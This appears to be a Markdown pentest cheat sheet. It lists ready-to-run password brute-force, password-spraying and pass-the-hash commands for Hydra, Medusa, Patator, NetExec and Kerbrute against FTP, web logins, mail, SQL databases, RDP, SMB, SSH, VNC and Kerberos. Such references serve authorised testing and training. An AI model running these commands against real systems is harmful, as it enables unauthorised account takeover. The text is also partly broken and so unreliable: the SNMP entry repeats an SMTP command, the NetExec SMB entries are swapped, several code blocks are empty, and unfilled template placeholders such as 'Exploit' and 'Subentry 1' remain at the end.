# Password Cracking

## Summary

* [Hydra](#hydra)
    * [FTP](#ftp)
    * [HTTP Basic Auth](#http-basic-auth)
    * [HTTP GET](#http-get)
    * [HTTP POST](#http-post)
    * [IMAP/S](#imap/s)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MySQL](#mysql)
    * [POP3/S](#pop3/s)
    * [PostgreSQL](#postegresql)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SMTP/S](#smtp/s)
    * [SNMP](#snmp)
    * [SSH](#ssh)
    * [Telnet](#telnet)
    * [VNC](#vnc)

 * [Medusa](#Medusa)
    * [FTP](#ftp)
    * [HTTP Basic Auth](#http-basic-auth)
    * [HTTP GET](#http-get)
    * [HTTP POST](#http-post)
    * [IMAP/S](#imap/s)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MySQL](#mysql)
    * [POP3/S](#pop3/s)
    * [PostgreSQL](#postgresql)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SMTP/S](#smtp/s)
    * [SNMP](#snmp)
    * [SSH](#ssh)
    * [Telnet](#telnet)
    * [VNC](#vnc)

* [Patator](#patator)
    * [FTP](#ftp)
    * [HTTP Basic Auth](#http-basic-auth)
    * [HTTP GET](#http-get)
    * [HTTP POST](#http-post)
    * [IMAP/S](#imap/s)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MSSQL Windows Authentication](#mssql-windowsauthentication)
    * [MySQL](#mysql)
    * [POP3/S](#pop3/s)
    * [PostgreSQL](#postegresql)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SMTP/S](#smtp/s)
    * [SNMP](#snmp)
    * [SSH/SFTP](#ssh/sftp)
    * [Telnet](#telnet)
    * [VNC](#vnc)

* [NetExec](#nxc)
    * [FTP](#ftp)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MSSQL Windows Authentication](#mssql-windowsauthentication)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SSH/SFTP](#ssh/sftp)
    * [VNC](#vnc)

 * [Kerbrute](#kerbrute)
    * [Kerberos](#kerberos)

* [Good Practices](#good-practices)
* [Labs](#labs)
* [References](#references)

## Hydra
Hydra is ....
For the sake of simplicity, we will perform a dictionary attack against a single user. To specify a list of usernames you can use the -L flag.
Note that hydra will try each password against each user when the -L flag is specified, even after finding a valid pair of login/pass.
Use the -f flag to stop the attack when a a valid pair of credentials is found.

### FTP
```
hydra -l <username> -P <passwords.txt> 10.10.10.10 ftp
```

### HTTP Basic Auth
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 http-get /login.php
```

### HTTP GET
```
hydra -l <user> -P <passwords.txt> 10.10.10.10 http-get-form '/login.php:username=^USER^&password=^PASS^:Incorrect username or password'
```
Note : Use https-get-form module for https websites with get method.

### HTTP POST
```
hydra -l <user> -P <passwords.txt> 10.10.10.10 http-post-form '/login.php:username=^USER^&password=^PASS^:Incorrect username or password'
```

### IMAP/S
```
hydra -l '<email>' -P '<passwords.txt>' 10.10.10.10 imap
```

### MSSQL SQL Server Authentication
MSSQL supports 02 main types of authentication : SQL server authentication and Windows authentication.
When it comes to SQL server authentication, the username and password are defined in SQL server and stored in the sys.sql_logins tables whereas in Windows authentication, the username and password are stored in the SAM or NTDS.dit database.
Thus, the accounts used for Windows authentication are local or domain windows accounts.
```
hydra -l '<user>' -P <passwords.txt> 10.10.10.10 mssql

e.g: hydra -l 'sa' -P rockyou.txt 10.10.10.10 mssql
```
Note : It's worth mentioning that hydra only supports MSSQL SQL Server Authentication

### MySQL
```
hydra -t 4 -L <users.txt> -P <passwords.txt> 10.10.10.10 mysql
```
Note : By default, the threshold lockout for MySQL is 100 (max_connect_errors = 100). Going beyond that limit will automatically lock your IP address and it will requires the database administrator intervention

### POP3/S
```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 pop3
```

Note: Consider switching to POP3s if you come across this error : Plaintext authentication disallowed on non-secure (SSL/TLS) connections.

```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 pop3s
```

### PostgreSQL
```
hydra -l '<username>' -P <passwords.txt> 10.10.10.10 postgres
```
Hydra did not work fine

### RDP
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 rdp
```

### SMB
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 smb
```

### SMTP/S
```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 smtp
```

### SNMP
```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 smtp
```

### SSH
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 ssh
```

### Telnet
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 telnet
```

### VNC
```
hydra -P <passwords.txt> -t1 10.10.10.10 vnc
```
Notes: 
1/ Usernames are not required when conducting a dictionary attack against vnc standard authentication 
2/By default VNC will block your IP address after five unsuccessful login attempts.

## Medusa

### FTP
```
medusa -h 10.10.10.10 -u '<user>' -P <passwords.txt> -M ftp
```

### HTTP Basic Auth
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M http -m AUTH:BASIC -m DIR:/login.php
```

### HTTP GET
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M web-form -m FORM:'/login.php' -m DENY-SIGNAL:'Login failed!' -m FORM-DATA:"get?username=&password="
```

### HTTP POST
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M web-form -m FORM:'/login.php' -m DENY-SIGNAL:'Incorrect username' -m FORM-DATA:"post?username=&password="
```

### IMAP/S
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M imap
```

### MSSQL
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M mssql
```
Note : Medusa does not support MSSQL windows authentication

### MySQL
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M mysql
```

### POP3/S
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M pop3
```

### PostgreSQL
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M postgres -m DB:<DB_NAME>
```

### RDP
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M rdp
```

### SMB
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M smbnt
```

### SMB (PtH)
```
medusa -h 10.10.10.10 -u '<user>' -p ':<nt_hash>' -M smbnt -m PASS:HASH [-m GROUP:<domain>]
```

### SMTP
```
medusa -h 10.10.10.10 -u '<email>' -P '<passwords.txt>' smtp
```

### SMTPS
```
medusa -h 10.10.10.10 -s -u '<email>' -P '<passwords.txt>' 
```
Note : This will target by default port 465. Use -n if you want to specify a different port

### SNMP
```
medusa -h 10.10.10.10 -u '' -P '<passwords.txt>' -M snmp
```
Notes: 
1/ This will not work for SNMPv3 as it uses username and password for authenticattion rather than relying on community strings like SNMPv1 and SNMPv2.
2/ You may notice that an empty username was specified in the command above. Unlikely, we cannot do otherwise as this is the behavior expected by Medusa

### SSH
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M ssh
```

### Telnet
```

```

### VNC
```
medusa -h 10.10.10.10 -u '' -P '<passwords.txt>' -M vnc
```
Note: The username is normally not required for this attack to work. Nevertheless, it was specified because Medusa needs it to work.

## Patator

### FTP
```
patator ftp_login host=10.10.10.10 user=<user> password=FILE0 0=<passwords.txt> -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
```

### FTPS
```
patator ftp_login host=10.10.10.10 tls=1 user=<user> password=FILE0 0=<passwords.txt> -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
```
As already explained above, this will conduct by default an explicit FTPS bruteforce attack. To conduct an implicit FTPS bruteforce, you only need to specify the port number using the port option.

### HTTP Basic Auth
```
patator http_fuzz url=http://10.10.10.10/login.php user_pass=COMBO00:COMBO01 0=<combo.txt> -x 'ignore:code=401'
```

### HTTP GET
```
patator http_fuzz url='http://10.10.10.10/login.php?username=<user>&password=FILE0' 0=<passwords.txt> method=GET accept_cookie=1 follow=1 -x ignore:fgrep='Incorrect username or password'
```
accept_cookie=1 will accept received cookies from the server and use them to issue future requests
follow=1 will follow redirections

### HTTP POST
```
patator http_fuzz url=http://10.10.10.10/login.php method=POST body='username=<user>&password=FILE0' 0=<passwords.txt> accept_cookie=1 follow=1 -x ignore:fgrep='Incorrect username or password'
```

### IMAP
```
patator imap_login host=10.10.10.10 user=<email> password=FILE0 0=<passwords.txt> -x 'ignore:fgrep=Authentication failed.'
```

### IMAPS
```
patator imap_login host=10.10.10.10 port=993 ssl=1 user=<email> password=FILE0 0=<passwords.txt> -x 'ignore:fgrep=Authentication failed.'
```

### MSSQL (SQL server Authentication)
```
patator mssql_login host=10.10.10.10 user=<sa> password=FILE0 0=<passwords.txt> -x ignore:fgrep='Login failed for user'
```

### MSSQL (Windows Authentication)
```
patator mssql_login windows_auth=1 host=10.10.10.10 user=<user> password=FILE0 0=<passwords.txt> -x ignore:fgrep='Login failed.'
```

### MySQL
```
patator mysql_login host=10.10.10.10 user=<user> password=FILE0 0=<passwords.txt> -x ignore:fgrep='Access denied for user'
```

### POP3
```
patator pop_login host=10.10.10.10 user=<user> password=FILE0 0=<passwords.txt> -x 'ignore:fgrep=Authentication failed.'
```

### POP3S
```
patator pop_login host=10.10.10.10 port=995 ssl=1 user=<user> password=FILE0 0=<passwords.txt> -x 'ignore:fgrep=Authentication failed.'
```

### PostgreSQL
```
patator pgsql_login host=10.10.10.10 database=<dbname> user=<user> password=FILE0 0=<passwords.txt> -x ignore:fgrep='password authentication failed for user'
```
database is the database to test. This will only be useful if the user 

### RDP
```
patator rdp_login host=10.10.10.10  user=<user> password=FILE0 0=<passwords.txt>
```
Warning: This module does not work properly as patator does not provide a way to filter authentication failure messages. You can use hydra as an alternative

### SMB
```
patator smb_login host=10.10.10.10 user=<user> password=FILE0 0=<passwords.txt> -x ignore:fgrep='STATUS_LOGON_FAILURE'
```

### SMB (PtH)
```
patator smb_login host=10.10.10.10 user=<user> password_hash=<nt_hash> [domain='<domain>'] -x ignore:fgrep='STATUS_LOGON_FAILURE'
```

### SMTP
```

```

### SMTPS
```

```

### SNMP
```
patator snmp_login host=10.10.10.10 community=FILE0 0=<passwords.txt> -x ignore:mesg='No SNMP response received before timeout'
```

### SSH
```
patator ssh_login host=10.10.10.10 user=<user> password=FILE0 0=<passwords.txt> -x ignore:mesg='Authentication failed.'
```

### Telnet
```

```

### VNC
```
patator vnc_login host=10.10.10.10 password=FILE0 0=<passwords.txt> --threads 1 --max-retries -1 -x 'ignore:fgrep=Authentication failure' -x quit:code=0
```

## NetExec

### FTP
```
nxc ftp 10.10.10.10 --username '<user>' --password <passwords.txt>
```

### MSSQL (SQL Server Authentication)
```
nxc mssql 10.10.10.10 --username '<user>' --password <passwords.txt> --local-auth
```

### MSSQL (Windows Authentication)
```
nxc mssql 10.10.10.10 [--domain <domain>] --username '<user' --password <passwords.txt>
```

### RDP
```
nxc rdp 10.10.10.10 [--domain <domain>] --username '<user' --password <passwords.txt>
```

### RDP (PtH)
```
nxc rdp 10.10.10.10 [--domain <domain>] --username '<user' --hash <nt_hash>
```

### SMB
```
nxc smb 10.10.10.10 [--domain <domain>] --username '<user>' --hash <nt_hash>
```

### SMB (PtH)
```
nxc smb 10.10.10.10 [--domain <domain>] --username '<user>' --password <passwords.txt>
```

### SSH
```
nxc ssh 10.10.10.10 --username '<user>' --password <passwords.txt>
```

### VNC
```
nxc vnc 10.10.10.10 --username '' --password <passwords.txt> --thread 1
```

## Kerbrute

### Kerberos
Users enumeration
```
kerbrute userenum --dc 10.10.10.10  -d <DOMAIN> <users.txt>
```

Brute force a single user's password using a wordlist
```
kerbrute bruteuser --dc 10.10.10.10 -d <DOMAIN> '<passwords.txt>' '<user>'
```

Password spraying
```
kerbrute passwordspray --dc 10.10.10.10 -d <DOMAIN> '<users.txt>' <password>
```

## Good Practices

## Labs

* [TryHackMe - Room Password Attacks](https://tryhackme.com/room/passwordattacks)
* [PortSwigger - Lab 2](https://portswigger.net)
* [HackTheBox - Lab 3](https://www.hackthebox.com)

## References

* [Blog title - Author (@handle) - Month XX, 202X](https://example.com)
















Quick explanation

```powershell
Exploit
```

### Subentry 1

### Subentry 2

## Labs

* [Root Me - Lab 1](https://root-me.org)
* [PortSwigger - Lab 2](https://portswigger.net)
* [HackTheBox - Lab 3](https://www.hackthebox.com)

## References

* [Blog title - Author (@handle) - Month XX, 202X](https://example.com)
* https://www.youtube.com/watch?v=-UY0fHckkGc

## Methodology

Quick explanation

```powershell
Exploit
```

### Subentry 1

### Subentry 2

